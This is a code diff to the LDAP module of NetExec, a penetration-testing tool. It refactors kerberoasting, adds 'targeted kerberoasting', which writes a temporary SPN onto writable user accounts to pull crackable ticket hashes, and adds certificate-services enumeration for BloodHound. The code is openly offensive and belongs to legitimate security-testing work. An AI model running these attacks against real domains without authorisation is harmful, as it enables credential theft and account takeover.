@@ -2,6 +2,7 @@
 # https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf
 import hashlib
 import hmac
+import json
 import os
 import socket
 from errno import EHOSTUNREACH, ETIMEDOUT, ENETUNREACH
@@ -17,6 +18,7 @@ from Cryptodome.Hash import MD4
 from OpenSSL.SSL import SysCallError
 from bloodhound.ad.authentication import ADAuthentication
 from bloodhound.ad.domain import AD
+from certihound import ADCSCollector, BloodHoundCEExporter, ImpacketLDAPAdapter
 from impacket.dcerpc.v5.samr import (
     UF_ACCOUNTDISABLE,
     UF_DONT_REQUIRE_PREAUTH,
@@ -32,20 +34,20 @@ from impacket.krb5.types import Principal, KerberosException
 from impacket.ldap import ldap as ldap_impacket
 from impacket.ldap import ldaptypes
 from impacket.ldap import ldapasn1 as ldapasn1_impacket
-from impacket.ldap.ldap import LDAPFilterSyntaxError
+from impacket.ldap.ldap import LDAPFilterSyntaxError, MODIFY_REPLACE
 from impacket.smbconnection import SessionError
 from impacket.ntlm import getNTLMSSPType1
 
 from nxc.config import process_secret, host_info_colors
 from nxc.connection import connection
 from nxc.helpers.bloodhound import add_user_bh
-from nxc.helpers.misc import get_bloodhound_info, convert, d2b
-from nxc.logger import NXCAdapter, nxc_logger
-from nxc.protocols.ldap.bloodhound import BloodHound
+from nxc.helpers.misc import get_bloodhound_info, convert, d2b, parse_argument
+from nxc.logger import NXCAdapter
+from nxc.protocols.ldap.bloodhound import BloodHound, resolve_collection_methods
 from nxc.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
 from nxc.protocols.ldap.kerberos import KerberosAttacks
 from nxc.parsers.ldap_results import parse_result_attributes
-from nxc.helpers.ntlm_parser import parse_challenge
+from nxc.helpers.negotiate_parser import parse_challenge
 from nxc.paths import CONFIG_PATH
 
 ldap_error_status = {
@@ -62,77 +64,6 @@ ldap_error_status = {
     "KDC_ERR_CLIENT_REVOKED": "KDC_ERR_CLIENT_REVOKED",
     "KDC_ERR_PREAUTH_FAILED": "KDC_ERR_PREAUTH_FAILED",
 }
-
-
-def resolve_collection_methods(methods):
-    """Convert methods (string) to list of validated methods to resolve"""
-    valid_methods = [
-        "group",
-        "localadmin",
-        "session",
-        "trusts",
-        "default",
-        "all",
-        "loggedon",
-        "objectprops",
-        "experimental",
-        "acl",
-        "dcom",
-        "rdp",
-        "psremote",
-        "dconly",
-        "container",
-    ]
-    default_methods = ["group", "localadmin", "session", "trusts"]
-    # Similar to SharpHound, All is not really all, it excludes loggedon
-    all_methods = [
-        "group",
-        "localadmin",
-        "session",
-        "trusts",
-        "objectprops",
-        "acl",
-        "dcom",
-        "rdp",
-        "psremote",
-        "container",
-    ]
-    # DC only, does not collect to computers
-    dconly_methods = ["group", "trusts", "objectprops", "acl", "container"]
-    if "," in methods:
-        method_list = [method.lower() for method in methods.split(",")]
-        validated_methods = []
-        for method in method_list:
-            if method not in valid_methods:
-                nxc_logger.error("Invalid collection method specified: %s", method)
-                return False
-
-            if method == "default":
-                validated_methods += default_methods
-            elif method == "all":
-                validated_methods += all_methods
-            elif method == "dconly":
-                validated_methods += dconly_methods
-            else:
-                validated_methods.append(method)
-        return set(validated_methods)
-    else:
-        validated_methods = []
-        # It is only one
-        method = methods.lower()
-        if method in valid_methods:
-            if method == "default":
-                validated_methods += default_methods
-            elif method == "all":
-                validated_methods += all_methods
-            elif method == "dconly":
-                validated_methods += dconly_methods
-            else:
-                validated_methods.append(method)
-            return set(validated_methods)
-        else:
-            nxc_logger.error("Invalid collection method specified: %s", method)
-            return False
 
 
 class ldap(connection):
@@ -319,7 +250,6 @@ class ldap(connection):
             self.domain = self.args.domain
         elif self.args.use_kcache:  # Fixing domain trust, just pull the auth domain out of the ticket
             self.domain = CCache.parseFile()[0]
-            self.username = CCache.parseFile()[1]
         else:
             self.domain = self.targetDomain
 
@@ -363,7 +293,7 @@ class ldap(connection):
             self.logger.fail("Simple bind and Kerberos authentication are mutually exclusive.")
             return False
 
-        self.username = username if not self.args.use_kcache else self.username    # With ccache we get the username from the ticket
+        self.username = username
         self.password = password
         self.domain = domain
         self.kdcHost = kdcHost
@@ -718,6 +648,10 @@ class ldap(connection):
             for item in resp_parsed:
                 if item:
                     self.admin_privs = True
+                    return
+
+        # If nothing matched we are not admin
+        self.admin_privs = False
 
     def getUnixTime(self, t):
         t -= 116444736000000000
@@ -810,7 +744,7 @@ class ldap(connection):
             self.logger.debug(f"Dumping group: {self.args.groups}")
 
             # Resolve group DN and primaryGroupID (objectSid)
-            group_resp = self.search(f"(cn={self.args.groups})", ["distinguishedName", "objectSid"])
+            group_resp = self.search(f"(&(cn={self.args.groups})(objectClass=group))", ["distinguishedName", "objectSid"])
             group_parsed = parse_result_attributes(group_resp)
 
             if not group_parsed:
@@ -838,7 +772,8 @@ class ldap(connection):
             else:
                 for item in resp_parsed:
                     # Display sAMAccountName or CN if sAMAccountName not present (could be a group)
-                    self.logger.highlight(item["sAMAccountName"] if "group" not in item["objectClass"] else item["cn"])
+                    # Fallback to cn should sAMAccountName not be present (e.g. Service Principal Names)
+                    self.logger.highlight(item.get("sAMAccountName", item["cn"]) if "group" not in item["objectClass"] else item["cn"])
         else:
             # Display all groups
             self.logger.highlight(f"{'-Group-':<40} {'-Members-':<9} {'-Description-':<60}")
@@ -1035,57 +970,15 @@ class ldap(connection):
 
     def kerberoasting(self):
         if self.args.no_preauth_targets:
-            usernames = []
-            for item in self.args.no_preauth_targets:
-                if os.path.isfile(item):
-                    with open(item, encoding="utf-8") as f:
-                        usernames.extend(line.strip() for line in f if line.strip())
-                else:
-                    usernames.append(item.strip())
-
-            skipped = []
-            hashes = []
-
-            for spn in usernames:
-                base_name = spn.split("/", 1)[0].split("@", 1)[0].rstrip()
-
-                if base_name.lower() == "krbtgt" or base_name.endswith("$"):
-                    skipped.append(base_name)
-                    continue
-
-                if not self.username:
-                    self.logger.fail("Likely executed without password flag. Please run the command with -p ''")
-                    return
-                hashline = KerberosAttacks(self).get_tgs_no_preauth(self.username, spn)
-                if hashline:
-                    hashes.append(hashline)
-
-            if skipped:
-                self.logger.display(f"Skipping account: {', '.join(skipped)}")
-            if hashes:
-                self.logger.display(f"Total of records returned {len(hashes)}")
-            else:
-                self.logger.highlight("No entries found!")
-
-            for line in hashes:
-                self.logger.highlight(line)
-                if self.args.kerberoasting:
-                    with open(self.args.kerberoasting, "a+", encoding="utf-8") as f:
-                        f.write(line + "\n")
+            self.roast_no_preauth()
             return
 
-        if self.args.kerberoast_account:
-            target_accounts = []
-            for item in self.args.kerberoast_account:
-                if os.path.isfile(item):
-                    try:
-                        with open(item, encoding="utf-8") as f:
-                            target_accounts.extend(line.strip() for line in f if line.strip())
-                    except Exception as e:
-                        self.logger.fail(f"Failed to read file '{item}': {e}")
-                else:
-                    target_accounts.append(item.strip())
-
+        if self.args.targeted_kerberoast:
+            target_users = parse_argument(self.args.targeted_kerberoast)
+            user_filter = "".join(f"(sAMAccountName={user})" for user in target_users)
+            searchFilter = f"(&(objectCategory=person)(!(servicePrincipalName=*))(|{user_filter}))"
+        elif self.args.kerberoast_account:
+            target_accounts = parse_argument(self.args.kerberoast_account)
             self.logger.info(f"Targeting specific accounts for kerberoasting: {', '.join(target_accounts)}")
 
             # build search filter for specific users
@@ -1103,8 +996,10 @@ class ldap(connection):
             "pwdLastSet",
             "lastLogon",
             "objectClass",
+            "distinguishedName",
         ]
-        resp = self.search(searchFilter, attributes, 0)
+
+        resp = self.search(searchFilter, attributes)
         resp_parsed = parse_result_attributes(resp)
         self.logger.debug(f"Search Filter: {searchFilter}")
         self.logger.debug(f"Attributes: {attributes}")
@@ -1112,26 +1007,43 @@ class ldap(connection):
 
         if not resp_parsed:
             self.logger.highlight("No entries found!")
-        else:
-            # Filter disabled accounts
-            disabled_accounts = [x for x in resp_parsed if int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
-            for account in disabled_accounts:
-                self.logger.display(f"Skipping disabled account: {account['sAMAccountName']}")
+            return
 
-            # Get all enabled accounts
-            enabled = [x for x in resp_parsed if not int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+        disabled_accounts = [x for x in resp_parsed if int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+        for account in disabled_accounts:
+            self.logger.display(f"Skipping disabled account: {account['sAMAccountName']}")
+
+        enabled = [x for x in resp_parsed if not int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+
+        if self.args.targeted_kerberoast:
+            self.logger.success(f"Found {len(enabled)} enabled users without SPN.")
+        else:
             self.logger.display(f"Total of records returned {len(enabled):d}")
 
-            for user in enabled:
-                # Perform Kerberos Attack
+        for user in enabled:
+            spn_added = False
+
+            if self.args.targeted_kerberoast:
+                try:
+                    self.ldap_connection.modify(user["distinguishedName"], {"servicePrincipalName": [(MODIFY_REPLACE, [f"cifs/{user['sAMAccountName']}"])]})
+                    self.logger.debug(f"SPN 'cifs/{user['sAMAccountName']}' added for {user['sAMAccountName']}")
+                    spn_added = True
+                except ldap_impacket.LDAPSessionError as e:
+                    if "insufficientAccessRights" in str(e) or "INSUFF_ACCESS_RIGHTS" in str(e):
+                        self.logger.fail(f"No write access to {user['sAMAccountName']}'s SPN attribute")
+                    else:
+                        self.logger.fail(f"LDAP error for {user['sAMAccountName']}: {e}")
+                        self.logger.debug("Traceback", exc_info=True)
+                    continue
+
+            try:
                 TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
                 self.logger.debug(f"TGT: {TGT}")
                 if TGT:
-                    downLevelLogonName = f"{self.targetDomain}\\{user['sAMAccountName']}"
                     try:
                         principalName = Principal()
                         principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
-                        principalName.components = [downLevelLogonName]
+                        principalName.components = [f"{self.targetDomain}\\{user['sAMAccountName']}"]
 
                         tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                             principalName,
@@ -1146,22 +1058,61 @@ class ldap(connection):
                             oldSessionKey,
                             sessionKey,
                             user["sAMAccountName"],
-                            downLevelLogonName,
+                            f"{self.targetDomain}\\{user['sAMAccountName']}",
                             is_computer="computer" in user.get("objectClass", [])
                         )
 
                         pwdLastSet = "<never>" if str(user.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["pwdLastSet"]))))
                         lastLogon = "<never>" if str(user.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["lastLogon"]))))
                         self.logger.display(f"sAMAccountName: {user['sAMAccountName']}, memberOf: {user.get('memberOf', [])}, pwdLastSet: {pwdLastSet}, lastLogon: {lastLogon}")
-                        self.logger.highlight(f"{out}")
+                        self.logger.highlight(out)
                         if self.args.kerberoasting:
                             with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
                                 hash_kerberoasting.write(out + "\n")
                     except Exception as e:
                         self.logger.debug(f"Exception: {e}", exc_info=True)
-                        self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
+                        self.logger.fail(f"Principal: {self.targetDomain}\\{user['sAMAccountName']} - {e}")
                 else:
                     self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
+            finally:
+                if spn_added:
+                    try:
+                        self.ldap_connection.modify(user["distinguishedName"], {"servicePrincipalName": [(MODIFY_REPLACE, [])]})
+                        self.logger.debug(f"SPN removed for {user['sAMAccountName']}")
+                    except Exception as cleanup_error:
+                        self.logger.fail(f"Failed to remove SPN for {user['sAMAccountName']}: {cleanup_error}")
+
+    def roast_no_preauth(self):
+        usernames = parse_argument(self.args.no_preauth_targets)
+
+        skipped = []
+        hashes = []
+
+        for spn in usernames:
+            base_name = spn.split("/", 1)[0].split("@", 1)[0].rstrip()
+
+            if base_name.lower() == "krbtgt" or base_name.endswith("$"):
+                skipped.append(base_name)
+                continue
+
+            if not self.username:
+                self.logger.fail("Likely executed without password flag. Please run the command with -p ''")
+                return
+            hashline = KerberosAttacks(self).get_tgs_no_preauth(self.username, spn)
+            if hashline:
+                hashes.append(hashline)
+
+        if skipped:
+            self.logger.display(f"Skipping account: {', '.join(skipped)}")
+        if hashes:
+            self.logger.display(f"Total of records returned {len(hashes)}")
+        else:
+            self.logger.highlight("No entries found!")
+
+        for line in hashes:
+            self.logger.highlight(line)
+            with open(self.args.kerberoasting, "a+") as f:
+                f.write(line + "\n")
 
     def query(self):
         """
@@ -1626,9 +1577,20 @@ class ldap(connection):
             break  # Only process first policy result
 
     def bloodhound(self):
-        # Check which version is desired
+        collect, excluded = resolve_collection_methods("Default" if not self.args.collection else self.args.collection, self.logger)
+        if not collect:
+            return
+        self.logger.highlight("Resolved collection methods: " + ", ".join(sorted(collect)))
+        self.logger.highlight("Excluded collection methods: " + ", ".join(sorted(excluded)))
+
+        # Check which BloodHound version is desired
         use_bhce = self.config.getboolean("BloodHound-CE", "bhce_enabled", fallback=False)
         package_name, version, is_ce = get_bloodhound_info()
+
+        # ADCS collection is only compatible with BloodHound-CE
+        if "adcs" in collect and not use_bhce:
+            self.logger.fail("ADCS collection is only compatible with the BloodHound-CE collector, but legacy bloodhound is selected")
+            return
 
         if use_bhce and not is_ce:
             self.logger.fail("⚠️  Configuration Issue Detected ⚠️")
@@ -1658,61 +1620,68 @@ class ldap(connection):
             self.logger.fail("pipx inject netexec bloodhound --force")
             return
 
-        auth = ADAuthentication(
-            username=self.username,
-            password=self.password,
-            domain=self.domain,
-            lm_hash=self.nthash,
-            nt_hash=self.nthash,
-            aeskey=self.aesKey,
-            kdc=self.kdcHost,
-            auth_method="auto",
-        )
-        ad = AD(
-            auth=auth,
-            domain=self.domain,
-            nameserver=self.args.dns_server,
-            dns_tcp=self.args.dns_tcp,
-            dns_timeout=self.args.dns_timeout,
-        )
-        collect = resolve_collection_methods("Default" if not self.args.collection else self.args.collection)
-        if not collect:
-            return
-        self.logger.highlight("Resolved collection methods: " + ", ".join(list(collect)))
-
-        self.logger.debug("Using DNS to retrieve domain information")
-        try:
-            ad.dns_resolve(domain=self.domain)
-        except (resolver.LifetimeTimeout, resolver.NoNameservers):
-            self.logger.fail("Bloodhound-python failed to resolve domain information, try specifying the DNS server.")
-            return
-
-        if self.args.kerberos:
-            self.logger.highlight("Using kerberos auth without ccache, getting TGT")
-            auth.get_tgt()
-        if self.args.use_kcache:
-            self.logger.highlight("Using kerberos auth from ccache")
-            auth.load_ccache()
-
         timestamp = datetime.now().strftime("%Y-%m-%d_%H%M%S") + "_"
-        bloodhound = BloodHound(ad, self.hostname, self.host, self.port)
-        bloodhound.connect()
+        adcs_files = []
 
-        try:
-            bloodhound.run(
-                collect=collect,
-                num_workers=10,
-                disable_pooling=False,
-                timestamp=timestamp,
-                fileNamePrefix=self.output_filename.split("/")[-1],
-                computerfile=None,
-                cachefile=None,
-                exclude_dcs=False,
+        # Separate ADCS from bloodhound-python methods
+        bh_collect = {m for m in collect if m != "adcs"}
+
+        # Run bloodhound-python collection if needed
+        if len(bh_collect) > 0:
+            auth = ADAuthentication(
+                username=self.username,
+                password=self.password,
+                domain=self.domain,
+                lm_hash=self.nthash,
+                nt_hash=self.nthash,
+                aeskey=self.aesKey,
+                kdc=self.kdcHost,
+                auth_method="auto",
             )
-        except Exception as e:
-            self.logger.fail(f"BloodHound collection failed: {e.__class__.__name__} - {e}")
-            self.logger.debug(f"BloodHound collection failed: {e.__class__.__name__} - {e}", exc_info=True)
-            return
+            ad = AD(
+                auth=auth,
+                domain=self.domain,
+                nameserver=self.args.dns_server,
+                dns_tcp=self.args.dns_tcp,
+                dns_timeout=self.args.dns_timeout,
+            )
+
+            self.logger.debug("Using DNS to retrieve domain information")
+            try:
+                ad.dns_resolve(domain=self.domain)
+            except (resolver.LifetimeTimeout, resolver.NoNameservers):
+                self.logger.fail("Bloodhound-python failed to resolve domain information, try specifying the DNS server.")
+                return
+
+            if self.args.kerberos:
+                self.logger.highlight("Using kerberos auth without ccache, getting TGT")
+                auth.get_tgt()
+            if self.args.use_kcache:
+                self.logger.highlight("Using kerberos auth from ccache")
+                auth.load_ccache()
+
+            bloodhound = BloodHound(ad, self.hostname, self.host, self.port)
+            bloodhound.connect()
+
+            try:
+                bloodhound.run(
+                    collect=bh_collect,
+                    num_workers=10,
+                    disable_pooling=False,
+                    timestamp=timestamp,
+                    fileNamePrefix=self.output_filename.split("/")[-1],
+                    computerfile=None,
+                    cachefile=None,
+                    exclude_dcs=False,
+                )
+            except Exception as e:
+                self.logger.fail(f"BloodHound collection failed: {e.__class__.__name__} - {e}")
+                self.logger.debug(f"BloodHound collection failed: {e.__class__.__name__} - {e}", exc_info=True)
+                return
+
+        # Collect ADCS data using CertiHound if requested
+        if "adcs" in collect:
+            adcs_files = self._collect_adcs_for_bloodhound(timestamp)
 
         self.logger.highlight(f"Compressing output into {self.output_filename}_bloodhound.zip")
         list_of_files = os.listdir(os.getcwd())
@@ -1721,3 +1690,57 @@ class ldap(connection):
                 if each_file.startswith(self.output_filename.split("/")[-1]) and each_file.endswith("json"):
                     z.write(each_file)
                     os.remove(each_file)
+            # Add ADCS files to the zip
+            for adcs_file in adcs_files:
+                if os.path.exists(adcs_file):
+                    z.write(adcs_file, os.path.basename(adcs_file))
+                    os.remove(adcs_file)
+
+    def _collect_adcs_for_bloodhound(self, timestamp):
+        """Collect ADCS data using CertiHound for BloodHound CE integration.
+
+        Args:
+            timestamp: Timestamp prefix for output files.
+
+        Returns:
+            List of file paths to include in the BloodHound zip.
+        """
+        self.logger.highlight("Collecting ADCS data (CertiHound)...")
+
+        try:
+            # Create CertiHound adapter and collector
+            adapter = ImpacketLDAPAdapter(
+                search_func=self.search,
+                domain=self.domain,
+                domain_sid=self.sid_domain,
+            )
+
+            collector = ADCSCollector.from_external(
+                ldap_connection=adapter,
+                domain=self.domain,
+                domain_sid=self.sid_domain,
+            )
+            data = collector.collect_all()
+
+            self.logger.highlight(f"Found {len(data.templates)} certificate templates")
+            self.logger.highlight(f"Found {len(data.enterprise_cas)} Enterprise CAs")
+
+            # Export to BloodHound CE format
+            exporter = BloodHoundCEExporter(data.domain, data.domain_sid)
+            result = exporter.export(data)
+
+            # Write individual JSON files
+            adcs_files = []
+            for node_type, content in result.to_dict().items():
+                filename = f"{timestamp}{node_type}.json"
+                with open(filename, "w") as f:
+                    json.dump(content, f)
+                adcs_files.append(filename)
+                self.logger.debug(f"Wrote ADCS file: {filename}")
+
+            return adcs_files
+
+        except Exception as e:
+            self.logger.fail(f"ADCS collection failed: {e}")
+            self.logger.debug(f"ADCS collection error: {e}", exc_info=True)
+            return []
